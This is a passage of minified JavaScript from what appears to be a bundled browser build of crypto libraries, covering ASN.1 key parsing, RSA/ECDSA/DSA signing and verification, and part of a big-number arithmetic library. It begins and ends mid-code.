            case "1.2.840.10040.4.1":
                return ae.algorithm.params.pub_key = _.DSAparam.decode(ae.subjectPublicKey.data, "der"),
                {
                    type: "dsa",
                    data: ae.algorithm.params
                };
            default:
                throw new Error("unknown key id " + ee)
            }
        case "ENCRYPTED PRIVATE KEY":
            Q = _.EncryptedPrivateKey.decode(Q, "der"),
            Q = b(Q, F);
        case "PRIVATE KEY":
            switch (ae = _.PrivateKey.decode(Q, "der"),
            ee = ae.algorithm.algorithm.join("."),
            ee) {
            case "1.2.840.113549.1.1.1":
                return _.RSAPrivateKey.decode(ae.subjectPrivateKey, "der");
            case "1.2.840.10045.2.1":
                return {
                    curve: ae.algorithm.curve,
                    privateKey: _.ECPrivateKey.decode(ae.subjectPrivateKey, "der").privateKey
                };
            case "1.2.840.10040.4.1":
                return ae.algorithm.params.priv_key = _.DSAparam.decode(ae.subjectPrivateKey, "der"),
                {
                    type: "dsa",
                    params: ae.algorithm.params
                };
            default:
                throw new Error("unknown key id " + ee)
            }
        case "RSA PUBLIC KEY":
            return _.RSAPublicKey.decode(Q, "der");
        case "RSA PRIVATE KEY":
            return _.RSAPrivateKey.decode(Q, "der");
        case "DSA PRIVATE KEY":
            return {
                type: "dsa",
                params: _.DSAPrivateKey.decode(Q, "der")
            };
        case "EC PRIVATE KEY":
            return Q = _.ECPrivateKey.decode(Q, "der"),
            {
                curve: Q.parameters.value,
                privateKey: Q.privateKey
            };
        default:
            throw new Error("unknown key type " + K)
        }
    }
    return X.signature = _.signature,
    parseAsn1 = X,
    parseAsn1
}
const require$$4 = {
    "1.3.132.0.10": "secp256k1",
    "1.3.132.0.33": "p224",
    "1.2.840.10045.3.1.1": "p192",
    "1.2.840.10045.3.1.7": "p256",
    "1.3.132.0.34": "p384",
    "1.3.132.0.35": "p521"
};
var hasRequiredSign;
function requireSign() {
    if (hasRequiredSign)
        return sign.exports;
    hasRequiredSign = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireBrowser$d()
      , j = requireBrowserifyRsa()
      , O = requireElliptic().ec
      , x = requireBn$4()
      , w = requireParseAsn1()
      , b = require$$4
      , X = 1;
    function Y(ue, fe, he, pe, ye) {
        var be = w(fe);
        if (be.curve) {
            if (pe !== "ecdsa" && pe !== "ecdsa/rsa")
                throw new Error("wrong private key type");
            return F(ue, be)
        } else if (be.type === "dsa") {
            if (pe !== "dsa")
                throw new Error("wrong private key type");
            return V(ue, be, he)
        }
        if (pe !== "rsa" && pe !== "ecdsa/rsa")
            throw new Error("wrong private key type");
        if (fe.padding !== void 0 && fe.padding !== X)
            throw new Error("illegal or unsupported padding mode");
        ue = _.concat([ye, ue]);
        for (var xe = be.modulus.byteLength(), Ae = [0, 1]; ue.length + Ae.length + 1 < xe; )
            Ae.push(255);
        Ae.push(0);
        for (var Ee = -1; ++Ee < ue.length; )
            Ae.push(ue[Ee]);
        var Be = j(Ae, be);
        return Be
    }
    function F(ue, fe) {
        var he = b[fe.curve.join(".")];
        if (!he)
            throw new Error("unknown curve " + fe.curve.join("."));
        var pe = new O(he)
          , ye = pe.keyFromPrivate(fe.privateKey)
          , be = ye.sign(ue);
        return _.from(be.toDER())
    }
    function V(ue, fe, he) {
        for (var pe = fe.params.priv_key, ye = fe.params.p, be = fe.params.q, xe = fe.params.g, Ae = new x(0), Ee, Be = ee(ue, be).mod(be), ce = !1, q = Q(pe, be, ue, he); ce === !1; )
            Ee = ne(be, q, he),
            Ae = oe(xe, Ee, ye, be),
            ce = Ee.invm(be).imul(Be.add(pe.mul(Ae))).mod(be),
            ce.cmpn(0) === 0 && (ce = !1,
            Ae = new x(0));
        return K(Ae, ce)
    }
    function K(ue, fe) {
        ue = ue.toArray(),
        fe = fe.toArray(),
        ue[0] & 128 && (ue = [0].concat(ue)),
        fe[0] & 128 && (fe = [0].concat(fe));
        var he = ue.length + fe.length + 4
          , pe = [48, he, 2, ue.length];
        return pe = pe.concat(ue, [2, fe.length], fe),
        _.from(pe)
    }
    function Q(ue, fe, he, pe) {
        if (ue = _.from(ue.toArray()),
        ue.length < fe.byteLength()) {
            var ye = _.alloc(fe.byteLength() - ue.length);
            ue = _.concat([ye, ue])
        }
        var be = he.length
          , xe = ae(he, fe)
          , Ae = _.alloc(be);
        Ae.fill(1);
        var Ee = _.alloc(be);
        return Ee = M(pe, Ee).update(Ae).update(_.from([0])).update(ue).update(xe).digest(),
        Ae = M(pe, Ee).update(Ae).digest(),
        Ee = M(pe, Ee).update(Ae).update(_.from([1])).update(ue).update(xe).digest(),
        Ae = M(pe, Ee).update(Ae).digest(),
        {
            k: Ee,
            v: Ae
        }
    }
    function ee(ue, fe) {
        var he = new x(ue)
          , pe = (ue.length << 3) - fe.bitLength();
        return pe > 0 && he.ishrn(pe),
        he
    }
    function ae(ue, fe) {
        ue = ee(ue, fe),
        ue = ue.mod(fe);
        var he = _.from(ue.toArray());
        if (he.length < fe.byteLength()) {
            var pe = _.alloc(fe.byteLength() - he.length);
            he = _.concat([pe, he])
        }
        return he
    }
    function ne(ue, fe, he) {
        var pe, ye;
        do {
            for (pe = _.alloc(0); pe.length * 8 < ue.bitLength(); )
                fe.v = M(he, fe.k).update(fe.v).digest(),
                pe = _.concat([pe, fe.v]);
            ye = ee(pe, ue),
            fe.k = M(he, fe.k).update(fe.v).update(_.from([0])).digest(),
            fe.v = M(he, fe.k).update(fe.v).digest()
        } while (ye.cmp(ue) !== -1);
        return ye
    }
    function oe(ue, fe, he, pe) {
        return ue.toRed(x.mont(he)).redPow(fe).fromRed().mod(pe)
    }
    return sign.exports = Y,
    sign.exports.getKey = Q,
    sign.exports.makeKey = ne,
    sign.exports
}
var verify_1, hasRequiredVerify;
function requireVerify() {
    if (hasRequiredVerify)
        return verify_1;
    hasRequiredVerify = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireBn$4()
      , j = requireElliptic().ec
      , O = requireParseAsn1()
      , x = require$$4;
    function w(F, V, K, Q, ee) {
        var ae = O(K);
        if (ae.type === "ec") {
            if (Q !== "ecdsa" && Q !== "ecdsa/rsa")
                throw new Error("wrong public key type");
            return b(F, V, ae)
        } else if (ae.type === "dsa") {
            if (Q !== "dsa")
                throw new Error("wrong public key type");
            return X(F, V, ae)
        }
        if (Q !== "rsa" && Q !== "ecdsa/rsa")
            throw new Error("wrong public key type");
        V = _.concat([ee, V]);
        for (var ne = ae.modulus.byteLength(), oe = [1], ue = 0; V.length + oe.length + 2 < ne; )
            oe.push(255),
            ue += 1;
        oe.push(0);
        for (var fe = -1; ++fe < V.length; )
            oe.push(V[fe]);
        oe = _.from(oe);
        var he = M.mont(ae.modulus);
        F = new M(F).toRed(he),
        F = F.redPow(new M(ae.publicExponent)),
        F = _.from(F.fromRed().toArray());
        var pe = ue < 8 ? 1 : 0;
        for (ne = Math.min(F.length, oe.length),
        F.length !== oe.length && (pe = 1),
        fe = -1; ++fe < ne; )
            pe |= F[fe] ^ oe[fe];
        return pe === 0
    }
    function b(F, V, K) {
        var Q = x[K.data.algorithm.curve.join(".")];
        if (!Q)
            throw new Error("unknown curve " + K.data.algorithm.curve.join("."));
        var ee = new j(Q)
          , ae = K.data.subjectPrivateKey.data;
        return ee.verify(V, F, ae)
    }
    function X(F, V, K) {
        var Q = K.data.p
          , ee = K.data.q
          , ae = K.data.g
          , ne = K.data.pub_key
          , oe = O.signature.decode(F, "der")
          , ue = oe.s
          , fe = oe.r;
        Y(ue, ee),
        Y(fe, ee);
        var he = M.mont(Q)
          , pe = ue.invm(ee)
          , ye = ae.toRed(he).redPow(new M(V).mul(pe).mod(ee)).fromRed().mul(ne.toRed(he).redPow(fe.mul(pe).mod(ee)).fromRed()).mod(Q).mod(ee);
        return ye.cmp(fe) === 0
    }
    function Y(F, V) {
        if (F.cmpn(0) <= 0)
            throw new Error("invalid sig");
        if (F.cmp(V) >= 0)
            throw new Error("invalid sig")
    }
    return verify_1 = w,
    verify_1
}
var browser$6, hasRequiredBrowser$6;
function requireBrowser$6() {
    if (hasRequiredBrowser$6)
        return browser$6;
    hasRequiredBrowser$6 = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireBrowser$b()
      , j = requireReadableBrowser()
      , O = requireInherits_browser()
      , x = requireSign()
      , w = requireVerify()
      , b = require$$6;
    Object.keys(b).forEach(function(K) {
        b[K].id = _.from(b[K].id, "hex"),
        b[K.toLowerCase()] = b[K]
    });
    function X(K) {
        j.Writable.call(this);
        var Q = b[K];
        if (!Q)
            throw new Error("Unknown message digest");
        this._hashType = Q.hash,
        this._hash = M(Q.hash),
        this._tag = Q.id,
        this._signType = Q.sign
    }
    O(X, j.Writable),
    X.prototype._write = function(Q, ee, ae) {
        this._hash.update(Q),
        ae()
    }
    ,
    X.prototype.update = function(Q, ee) {
        return this._hash.update(typeof Q == "string" ? _.from(Q, ee) : Q),
        this
    }
    ,
    X.prototype.sign = function(Q, ee) {
        this.end();
        var ae = this._hash.digest()
          , ne = x(ae, Q, this._hashType, this._signType, this._tag);
        return ee ? ne.toString(ee) : ne
    }
    ;
    function Y(K) {
        j.Writable.call(this);
        var Q = b[K];
        if (!Q)
            throw new Error("Unknown message digest");
        this._hash = M(Q.hash),
        this._tag = Q.id,
        this._signType = Q.sign
    }
    O(Y, j.Writable),
    Y.prototype._write = function(Q, ee, ae) {
        this._hash.update(Q),
        ae()
    }
    ,
    Y.prototype.update = function(Q, ee) {
        return this._hash.update(typeof Q == "string" ? _.from(Q, ee) : Q),
        this
    }
    ,
    Y.prototype.verify = function(Q, ee, ae) {
        var ne = typeof ee == "string" ? _.from(ee, ae) : ee;
        this.end();
        var oe = this._hash.digest();
        return w(ne, oe, Q, this._signType, this._tag)
    }
    ;
    function F(K) {
        return new X(K)
    }
    function V(K) {
        return new Y(K)
    }
    return browser$6 = {
        Sign: F,
        Verify: V,
        createSign: F,
        createVerify: V
    },
    browser$6
}
var bn$3 = {
    exports: {}
}, bn$2 = bn$3.exports, hasRequiredBn$1;
function requireBn$1() {
    return hasRequiredBn$1 || (hasRequiredBn$1 = 1,
    function(_) {
        (function(M, j) {
            function O(ce, q) {
                if (!ce)
                    throw new Error(q || "Assertion failed")
            }
            function x(ce, q) {
                ce.super_ = q;
                var L = function() {};
                L.prototype = q.prototype,
                ce.prototype = new L,
                ce.prototype.constructor = ce
            }
            function w(ce, q, L) {
                if (w.isBN(ce))
                    return ce;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                ce !== null && ((q === "le" || q === "be") && (L = q,
                q = 10),
                this._init(ce || 0, q || 10, L || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(q) {
                return q instanceof w ? !0 : q !== null && typeof q == "object" && q.constructor.wordSize === w.wordSize && Array.isArray(q.words)
            }
            ,
            w.max = function(q, L) {
                return q.cmp(L) > 0 ? q : L
            }
            ,
            w.min = function(q, L) {
                return q.cmp(L) < 0 ? q : L
            }
            ,
            w.prototype._init = function(q, L, U) {
                if (typeof q == "number")
                    return this._initNumber(q, L, U);
                if (typeof q == "object")
                    return this._initArray(q, L, U);
                L === "hex" && (L = 16),
                O(L === (L | 0) && L >= 2 && L <= 36),
                q = q.toString().replace(/\s+/g, "");
                var Z = 0;
                q[0] === "-" && (Z++,
                this.negative = 1),
                Z < q.length && (L === 16 ? this._parseHex(q, Z, U) : (this._parseBase(q, L, Z),
                U === "le" && this._initArray(this.toArray(), L, U)))
            }
            ,
            w.prototype._initNumber = function(q, L, U) {
                q < 0 && (this.negative = 1,
                q = -q),
                q < 67108864 ? (this.words = [q & 67108863],
                this.length = 1) : q < 4503599627370496 ? (this.words = [q & 67108863, q / 67108864 & 67108863],
                this.length = 2) : (O(q < 9007199254740992),
                this.words = [q & 67108863, q / 67108864 & 67108863, 1],
                this.length = 3),
                U === "le" && this._initArray(this.toArray(), L, U)
            }
            ,
            w.prototype._initArray = function(q, L, U) {
                if (O(typeof q.length == "number"),
                q.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(q.length / 3),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te, se, de = 0;
                if (U === "be")
                    for (Z = q.length - 1,
                    te = 0; Z >= 0; Z -= 3)
                        se = q[Z] | q[Z - 1] << 8 | q[Z - 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                else if (U === "le")
                    for (Z = 0,
                    te = 0; Z < q.length; Z += 3)
                        se = q[Z] | q[Z + 1] << 8 | q[Z + 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                return this.strip()
            }
            ;
            function X(ce, q) {
                var L = ce.charCodeAt(q);
                return L >= 65 && L <= 70 ? L - 55 : L >= 97 && L <= 102 ? L - 87 : L - 48 & 15
            }
            function Y(ce, q, L) {
                var U = X(ce, L);
                return L - 1 >= q && (U |= X(ce, L - 1) << 4),
                U
            }
            w.prototype._parseHex = function(q, L, U) {
                this.length = Math.ceil((q.length - L) / 6),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te = 0, se = 0, de;
                if (U === "be")
                    for (Z = q.length - 1; Z >= L; Z -= 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8;
                else {
                    var re = q.length - L;
                    for (Z = re % 2 === 0 ? L + 1 : L; Z < q.length; Z += 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8
                }
                this.strip()
            }
            ;
            function F(ce, q, L, U) {
                for (var Z = 0, te = Math.min(ce.length, L), se = q; se < te; se++) {
                    var de = ce.charCodeAt(se) - 48;
                    Z *= U,
                    de >= 49 ? Z += de - 49 + 10 : de >= 17 ? Z += de - 17 + 10 : Z += de
                }
                return Z
            }
            w.prototype._parseBase = function(q, L, U) {
                this.words = [0],
                this.length = 1;
                for (var Z = 0, te = 1; te <= 67108863; te *= L)
                    Z++;
                Z--,
                te = te / L | 0;
                for (var se = q.length - U, de = se % Z, re = Math.min(se, se - de) + U, $ = 0, ie = U; ie < re; ie += Z)
                    $ = F(q, ie, ie + Z, L),
                    this.imuln(te),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($);
                if (de !== 0) {
                    var ve = 1;
                    for ($ = F(q, ie, q.length, L),
                    ie = 0; ie < de; ie++)
                        ve *= L;
                    this.imuln(ve),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($)
                }
                this.strip()
            }
            ,
            w.prototype.copy = function(q) {
                q.words = new Array(this.length);
                for (var L = 0; L < this.length; L++)
                    q.words[L] = this.words[L];
                q.length = this.length,
                q.negative = this.negative,
                q.red = this.red
            }
            ,
            w.prototype.clone = function() {
                var q = new w(null);
                return this.copy(q),
                q
            }
            ,
            w.prototype._expand = function(q) {
                for (; this.length < q; )
                    this.words[this.length++] = 0;
                return this
            }
            ,
            w.prototype.strip = function() {
                for (; this.length > 1 && this.words[this.length - 1] === 0; )
                    this.length--;
                return this._normSign()
            }
            ,
            w.prototype._normSign = function() {
                return this.length === 1 && this.words[0] === 0 && (this.negative = 0),
                this
            }
            ,
            w.prototype.inspect = function() {
                return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
            }
            ;
            var V = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"]
              , K = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5]
              , Q = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            w.prototype.toString = function(q, L) {
                q = q || 10,
                L = L | 0 || 1;
                var U;
                if (q === 16 || q === "hex") {
                    U = "";
                    for (var Z = 0, te = 0, se = 0; se < this.length; se++) {
                        var de = this.words[se]
                          , re = ((de << Z | te) & 16777215).toString(16);
                        te = de >>> 24 - Z & 16777215,
                        Z += 2,
                        Z >= 26 && (Z -= 26,
                        se--),
                        te !== 0 || se !== this.length - 1 ? U = V[6 - re.length] + re + U : U = re + U
                    }
                    for (te !== 0 && (U = te.toString(16) + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                if (q === (q | 0) && q >= 2 && q <= 36) {
                    var $ = K[q]
                      , ie = Q[q];
                    U = "";
                    var ve = this.clone();
                    for (ve.negative = 0; !ve.isZero(); ) {
                        var ge = ve.modn(ie).toString(q);
                        ve = ve.idivn(ie),
                        ve.isZero() ? U = ge + U : U = V[$ - ge.length] + ge + U
                    }
                    for (this.isZero() && (U = "0" + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                O(!1, "Base should be between 2 and 36")
            }
            ,
            w.prototype.toNumber = function() {
                var q = this.words[0];
                return this.length === 2 ? q += this.words[1] * 67108864 : this.length === 3 && this.words[2] === 1 ? q += 4503599627370496 + this.words[1] * 67108864 : this.length > 2 && O(!1, "Number can only safely store up to 53 bits"),
                this.negative !== 0 ? -q : q
            }
            ,
            w.prototype.toJSON = function() {
                return this.toString(16)
            }
            ,
            w.prototype.toBuffer = function(q, L) {
                return O(typeof b < "u"),
                this.toArrayLike(b, q, L)
            }
            ,
            w.prototype.toArray = function(q, L) {
                return this.toArrayLike(Array, q, L)
            }
            ,
            w.prototype.toArrayLike = function(q, L, U) {
                var Z = this.byteLength()
                  , te = U || Math.max(1, Z);
                O(Z <= te, "byte array longer than desired length"),
                O(te > 0, "Requested array length <= 0"),
                this.strip();
                var se = L === "le", de = new q(te), re, $, ie = this.clone();
                if (se) {
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[$] = re;
                    for (; $ < te; $++)
                        de[$] = 0
                } else {
                    for ($ = 0; $ < te - Z; $++)
                        de[$] = 0;
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[te - $ - 1] = re
                }
                return de
            }
            ,
            Math.clz32 ? w.prototype._countBits = function(q) {
                return 32 - Math.clz32(q)
            }
            : w.prototype._countBits = function(q) {
                var L = q
                  , U = 0;
                return L >= 4096 && (U += 13,
                L >>>= 13),
                L >= 64 && (U += 7,
                L >>>= 7),
                L >= 8 && (U += 4,
                L >>>= 4),
                L >= 2 && (U += 2,
                L >>>= 2),
                U + L
            }
            ,
            w.prototype._zeroBits = function(q) {
                if (q === 0)
                    return 26;
                var L = q
                  , U = 0;
                return (L & 8191) === 0 && (U += 13,
                L >>>= 13),
                (L & 127) === 0 && (U += 7,
                L >>>= 7),
                (L & 15) === 0 && (U += 4,
                L >>>= 4),
                (L & 3) === 0 && (U += 2,
                L >>>= 2),
                (L & 1) === 0 && U++,
                U
            }
            ,
            w.prototype.bitLength = function() {
                var q = this.words[this.length - 1]
                  , L = this._countBits(q);
                return (this.length - 1) * 26 + L
            }
            ;
            function ee(ce) {
                for (var q = new Array(ce.bitLength()), L = 0; L < q.length; L++) {
                    var U = L / 26 | 0
                      , Z = L % 26;
                    q[L] = (ce.words[U] & 1 << Z) >>> Z
                }
                return q
            }
            w.prototype.zeroBits = function() {
                if (this.isZero())
                    return 0;
                for (var q = 0, L = 0; L < this.length; L++) {
                    var U = this._zeroBits(this.words[L]);
                    if (q += U,
                    U !== 26)
                        break
                }
                return q
            }
            ,
            w.prototype.byteLength = function() {
                return Math.ceil(this.bitLength() / 8)
            }
            ,
            w.prototype.toTwos = function(q) {
                return this.negative !== 0 ? this.abs().inotn(q).iaddn(1) : this.clone()
            }
            ,
            w.prototype.fromTwos = function(q) {
                return this.testn(q - 1) ? this.notn(q).iaddn(1).ineg() : this.clone()
            }
            ,
            w.prototype.isNeg = function() {
                return this.negative !== 0
            }
            ,
            w.prototype.neg = function() {
                return this.clone().ineg()
            }
            ,
            w.prototype.ineg = function() {
                return this.isZero() || (this.negative ^= 1),
                this
            }
            ,
            w.prototype.iuor = function(q) {
                for (; this.length < q.length; )
                    this.words[this.length++] = 0;
                for (var L = 0; L < q.length; L++)
                    this.words[L] = this.words[L] | q.words[L];
                return this.strip()
            }
            ,
            w.prototype.ior = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuor(q)
            }
            ,
            w.prototype.or = function(q) {
                return this.length > q.length ? this.clone().ior(q) : q.clone().ior(this)
            }
            ,
            w.prototype.uor = function(q) {
                return this.length > q.length ? this.clone().iuor(q) : q.clone().iuor(this)
            }
            ,
            w.prototype.iuand = function(q) {
                var L;
                this.length > q.length ? L = q : L = this;
                for (var U = 0; U < L.length; U++)
                    this.words[U] = this.words[U] & q.words[U];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.iand = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuand(q)
            }
            ,
            w.prototype.and = function(q) {
                return this.length > q.length ? this.clone().iand(q) : q.clone().iand(this)
            }
            ,
            w.prototype.uand = function(q) {
                return this.length > q.length ? this.clone().iuand(q) : q.clone().iuand(this)
            }
            ,
            w.prototype.iuxor = function(q) {
                var L, U;
                this.length > q.length ? (L = this,
                U = q) : (L = q,
                U = this);
                for (var Z = 0; Z < U.length; Z++)
                    this.words[Z] = L.words[Z] ^ U.words[Z];
                if (this !== L)
                    for (; Z < L.length; Z++)
                        this.words[Z] = L.words[Z];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.ixor = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuxor(q)
            }
            ,
            w.prototype.xor = function(q) {
                return this.length > q.length ? this.clone().ixor(q) : q.clone().ixor(this)
            }
            ,
            w.prototype.uxor = function(q) {
                return this.length > q.length ? this.clone().iuxor(q) : q.clone().iuxor(this)
            }
            ,
            w.prototype.inotn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = Math.ceil(q / 26) | 0
                  , U = q % 26;
                this._expand(L),
                U > 0 && L--;
                for (var Z = 0; Z < L; Z++)
                    this.words[Z] = ~this.words[Z] & 67108863;
                return U > 0 && (this.words[Z] = ~this.words[Z] & 67108863 >> 26 - U),
                this.strip()
            }
            ,
            w.prototype.notn = function(q) {
                return this.clone().inotn(q)
            }
            ,
            w.prototype.setn = function(q, L) {
                O(typeof q == "number" && q >= 0);
                var U = q / 26 | 0
                  , Z = q % 26;
                return this._expand(U + 1),
                L ? this.words[U] = this.words[U] | 1 << Z : this.words[U] = this.words[U] & ~(1 << Z),
                this.strip()
            }
            ,
            w.prototype.iadd = function(q) {
                var L;
                if (this.negative !== 0 && q.negative === 0)
                    return this.negative = 0,
                    L = this.isub(q),
                    this.negative ^= 1,
                    this._normSign();
                if (this.negative === 0 && q.negative !== 0)
                    return q.negative = 0,
                    L = this.isub(q),
                    q.negative = 1,
                    L._normSign();
                var U, Z;
                this.length > q.length ? (U = this,
                Z = q) : (U = q,
                Z = this);
                for (var te = 0, se = 0; se < Z.length; se++)
                    L = (U.words[se] | 0) + (Z.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                for (; te !== 0 && se < U.length; se++)
                    L = (U.words[se] | 0) + te,
                    this.words[se] = L & 67108863,
                    te = L >>> 26;
                if (this.length = U.length,
                te !== 0)
                    this.words[this.length] = te,
                    this.length++;
                else if (U !== this)
                    for (; se < U.length; se++)
                        this.words[se] = U.words[se];
                return this
            }
            ,
            w.prototype.add = function(q) {
                var L;
                return q.negative !== 0 && this.negative === 0 ? (q.negative = 0,
                L = this.sub(q),
                q.negative ^= 1,
                L) : q.negative === 0 && this.negative !== 0 ? (this.negative = 0,
                L = q.sub(this),
                this.negative = 1,
                L) : this.length > q.length ? this.clone().iadd(q) : q.clone().iadd(this)
            }
            ,
            w.prototype.isub = function(q) {
                if (q.negative !== 0) {
                    q.negative = 0;
                    var L = this.iadd(q);
                    return q.negative = 1,
                    L._normSign()
                } else if (this.negative !== 0)
                    return this.negative = 0,
                    this.iadd(q),
                    this.negative = 1,
                    this._normSign();
                var U = this.cmp(q);
                if (U === 0)
                    return this.negative = 0,
                    this.length = 1,
                    this.words[0] = 0,
                    this;
                var Z, te;
                U > 0 ? (Z = this,
                te = q) : (Z = q,
                te = this);
                for (var se = 0, de = 0; de < te.length; de++)
                    L = (Z.words[de] | 0) - (te.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                for (; se !== 0 && de < Z.length; de++)
                    L = (Z.words[de] | 0) + se,
                    se = L >> 26,
                    this.words[de] = L & 67108863;
                if (se === 0 && de < Z.length && Z !== this)
                    for (; de < Z.length; de++)
                        this.words[de] = Z.words[de];
                return this.length = Math.max(this.length, de),
                Z !== this && (this.negative = 1),
                this.strip()
            }
            ,
            w.prototype.sub = function(q) {
                return this.clone().isub(q)
            }
            ;
            function ae(ce, q, L) {
                L.negative = q.negative ^ ce.negative;
                var U = ce.length + q.length | 0;
                L.length = U,
                U = U - 1 | 0;
                var Z = ce.words[0] | 0
                  , te = q.words[0] | 0
                  , se = Z * te
                  , de = se & 67108863
                  , re = se / 67108864 | 0;
                L.words[0] = de;
                for (var $ = 1; $ < U; $++) {
                    for (var ie = re >>> 26, ve = re & 67108863, ge = Math.min($, q.length - 1), Re = Math.max(0, $ - ce.length + 1); Re <= ge; Re++) {
                        var Pe = $ - Re | 0;
                        Z = ce.words[Pe] | 0,
                        te = q.words[Re] | 0,
                        se = Z * te + ve,
                        ie += se / 67108864 | 0,
                        ve = se & 67108863
                    }
                    L.words[$] = ve | 0,
                    re = ie | 0
                }
                return re !== 0 ? L.words[$] = re | 0 : L.length--,
                L.strip()
            }
            var ne = function(q, L, U) {
                var Z = q.words, te = L.words, se = U.words, de = 0, re, $, ie, ve = Z[0] | 0, ge = ve & 8191, Re = ve >>> 13, Pe = Z[1] | 0, Ie = Pe & 8191, Te = Pe >>> 13, Le = Z[2] | 0, Ze = Le & 8191, $e = Le >>> 13, Ne = Z[3] | 0, qe = Ne & 8191, Ve = Ne >>> 13, lt = Z[4] | 0, nt = lt & 8191, je = lt >>> 13, Ke = Z[5] | 0, Qe = Ke & 8191, We = Ke >>> 13, mt = Z[6] | 0, ct = mt & 8191, vt = mt >>> 13, we = Z[7] | 0, _e = we & 8191, Ce = we >>> 13, st = Z[8] | 0, et = st & 8191, tt = st >>> 13, He = Z[9] | 0, ke = He & 8191, Me = He >>> 13, Ue = te[0] | 0, rt = Ue & 8191, dt = Ue >>> 13, Et = te[1] | 0, ft = Et & 8191, gt = Et >>> 13, Yt = te[2] | 0, Ct = Yt & 8191, Ot = Yt >>> 13, Vt = te[3] | 0, Pt = Vt & 8191, Bt = Vt >>> 13, xr = te[4] | 0, Dt = xr & 8191, Ft = xr >>> 13, Mr = te[5] | 0, at = Mr & 8191, ze = Mr >>> 13, Je = te[6] | 0, ht = Je & 8191, _t = Je >>> 13, Ge = te[7] | 0, Ye = Ge & 8191, it = Ge >>> 13, Fe = te[8] | 0, ut = Fe & 8191, wt = Fe >>> 13, At = te[9] | 0, St = At & 8191, Tt = At >>> 13;
                U.negative = q.negative ^ L.negative,
                U.length = 19,
                re = Math.imul(ge, rt),
                $ = Math.imul(ge, dt),
                $ = $ + Math.imul(Re, rt) | 0,
                ie = Math.imul(Re, dt);
                var er = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (er >>> 26) | 0,
                er &= 67108863,
                re = Math.imul(Ie, rt),
                $ = Math.imul(Ie, dt),
                $ = $ + Math.imul(Te, rt) | 0,
                ie = Math.imul(Te, dt),
                re = re + Math.imul(ge, ft) | 0,
                $ = $ + Math.imul(ge, gt) | 0,
                $ = $ + Math.imul(Re, ft) | 0,
                ie = ie + Math.imul(Re, gt) | 0;
                var Xt = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Xt >>> 26) | 0,
                Xt &= 67108863,
                re = Math.imul(Ze, rt),
                $ = Math.imul(Ze, dt),
                $ = $ + Math.imul($e, rt) | 0,
                ie = Math.imul($e, dt),
                re = re + Math.imul(Ie, ft) | 0,
                $ = $ + Math.imul(Ie, gt) | 0,
                $ = $ + Math.imul(Te, ft) | 0,
                ie = ie + Math.imul(Te, gt) | 0,
                re = re + Math.imul(ge, Ct) | 0,
                $ = $ + Math.imul(ge, Ot) | 0,
                $ = $ + Math.imul(Re, Ct) | 0,
                ie = ie + Math.imul(Re, Ot) | 0;
                var pr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (pr >>> 26) | 0,
                pr &= 67108863,
                re = Math.imul(qe, rt),
                $ = Math.imul(qe, dt),
